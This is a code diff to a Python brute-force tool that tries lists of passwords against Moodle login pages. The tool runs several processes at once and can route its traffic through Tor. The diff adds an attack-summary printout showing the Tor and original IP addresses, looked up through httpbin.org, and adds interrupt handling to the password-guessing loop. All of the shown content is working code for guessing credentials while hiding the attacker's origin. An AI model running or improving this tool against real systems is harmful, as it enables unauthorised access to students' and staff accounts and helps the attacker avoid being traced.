@@ -74,7 +74,11 @@ class MoodleLogin:
 
         return self._password
 
-    def getIPAddress(self):
+    def getOriginalIPAdress(self):
+
+        return (json.loads(requests.get("http://httpbin.org/ip", proxies=None).text))["origin"]
+
+    def getTorIPAddress(self):
 
         return (json.loads(requests.get("http://httpbin.org/ip", proxies=self._proxies).text))["origin"]
 
@@ -108,6 +112,24 @@ class MoodleLogin:
         return True if regex.search(response) else False
 
 ##############################################################################################
+
+def showInformationFromAttack(args: tuple) -> None:
+
+    (moodleLogin, totalPasswords, type_attack, processes, tor_proxy) = args
+
+    print(" Information from attack")
+    print(" =======================\n")
+
+    print(f" Total CPU Cores: {multiprocessing.cpu_count()}")
+    print(f" Total processes to use: {processes}")
+    print(f" Total passwords to test: {totalPasswords}")
+    print(f" Tor Proxy activated: {tor_proxy}")
+
+    if tor_proxy:
+        print(f" Tor Proxy IP address: {moodleLogin.getTorIPAddress()}")
+
+    print(f" Original IP address: {moodleLogin.getOriginalIPAdress()}")
+    print(f" Type attack: {type_attack}\n")
 
 def getLinesFromFile(filename: str) -> list:
 
@@ -169,16 +191,22 @@ def findPassword(args: tuple) -> bool:
     index = 0
     finded = False
 
-    while index < len(passwords) and not finded:
+    try:
 
-        password = passwords[index]
-        moodleLogin.setPassword(password)
-        print(f" [{moodleLogin.getIPAddress()}] Trying with {password}")
-        
-        if moodleLogin.getLoginStatus():
-            finded = True
+        while index < len(passwords) and not finded:
 
-        index += 1
+            password = passwords[index]
+            moodleLogin.setPassword(password)
+            print(f" Trying with {password}")
+            
+            if moodleLogin.getLoginStatus():
+                finded = True
+
+            index += 1
+
+    except KeyboardInterrupt:
+
+        sys.exit(1)
 
     return False if not finded else password
 
@@ -196,8 +224,7 @@ def startAttack(args: tuple) -> None:
     if tor_proxy:
         moodleLogin.setTorProxy()
 
-    print(f" Total CPU Cores: {multiprocessing.cpu_count()}")
-    print(f" Total processes to use: {processes}\n\n")
+    showInformationFromAttack((moodleLogin, len(passwords), type_attack, processes, tor_proxy))
 
     print(f" {colors.WHITE}[{colors.BLUE}*{colors.WHITE}] Launching attack ...\n\n")
 
